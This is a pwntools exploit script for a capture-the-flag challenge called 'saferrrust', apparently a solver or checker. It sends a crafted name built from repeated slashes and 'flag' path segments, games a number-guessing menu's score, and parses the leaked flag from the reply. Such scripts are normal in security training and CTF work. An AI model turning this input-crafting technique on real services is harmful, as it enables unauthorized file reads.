from pwn import *
import sys

if len(sys.argv) > 1 and sys.argv[1]=="debug":
    p = process("./saferrrust")
else:
    HOST = os.environ.get("HOST", 'localhost')
    PORT = int(os.environ.get("PORT",5555))
    TICKET = os.environ.get("TICKET")
    p = remote(HOST, PORT)
    if TICKET:
        p.readuntil('Ticket please: ')
        p.sendline(TICKET.encode("latin-1"))


context.clear(log_level='warn')


n = b"///////////flag/////flag/////flag"


p.send(n+b"\n")
p.recvuntil(b"Exit\n")

#this is not really necessary
p.send(b"1\n")
try:
    v = p.recvuntil(b"(both excluded)!\n")
    #print(v)
except:
    print("ERROR0 ==========>", p.buffer.get())
cscore = int(v.split(b"score is ")[1].split(b".")[0])
nmin = int(v.split(b"between ")[1].split(b" ")[0])
nmax = int(v.split(b"and ")[1].split(b"(")[0])
print((cscore, nmin, nmax))
p.send(str(nmax-1).encode("utf8")+b"\n")


p.send(b"2\n0\n")
p.recvuntil(b"Exit\n")

#import time; time.sleep(10)

while True:
    p.send(b"1\n")
    try:
        v = p.recvuntil(b"(both excluded)!\n")
        #print(v)
    except:
        print("ERROR1 ==========>", p.buffer.get())
        break

    cscore = int(v.split(b"score is ")[1].split(b".")[0])
    nmin = int(v.split(b"between ")[1].split(b" ")[0])
    nmax = int(v.split(b"and ")[1].split(b"(")[0])
    print((cscore, nmin, nmax))

    if cscore < (128-100):
        p.send(str(nmax-1).encode("utf8")+b"\n")
    elif cscore > (128-100):
        p.send(str(nmax).encode("utf8")+b"\n")
    else:
        p.send(str(nmax-1).encode("utf8")+b"\n")
        try:
            v2 = p.recvuntil(b"===")
        except:
            print("ERROR3 ==========>", p.buffer.get())
        print("==========>", v2)
        if b"Correct" in v2:
            break

p.send(b"3\n3\n")
#import time; time.sleep(10)
p.send(b"1\n")

try:
    v = p.recvuntil(b"! Your current score")
except:
    print("ERROR2 ==========>", p.buffer.get())
print(v)
flag = (v.split(b"Hello")[1].split(b"}!")[0]+b"}").decode("utf8").strip()
#p.interactive()
#v = p.recvline()
#print(v)
print("flag len", len(flag))
assert "flag{" in flag
assert "}" in flag
print("FLAG:", flag)


